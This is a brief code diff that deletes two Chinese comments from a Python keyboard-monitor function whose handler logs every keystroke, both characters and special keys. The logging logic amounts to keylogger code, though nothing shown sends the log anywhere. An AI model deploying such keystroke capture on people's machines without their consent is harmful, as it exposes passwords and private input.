@@ -6,11 +6,9 @@ def start_keyboard_monitor():
 
     def on_press(key):
         try:
-            # 普通字母、主键盘数字、符号
             char = key.char
             write_log(f"键盘输入 | 普通字符: {char}")
         except AttributeError:
-            # 功能键 / 小键盘按键
             key_name = str(key).replace("Key.", "")
             write_log(f"键盘输入 | 功能/小键盘键: {key_name}")
 
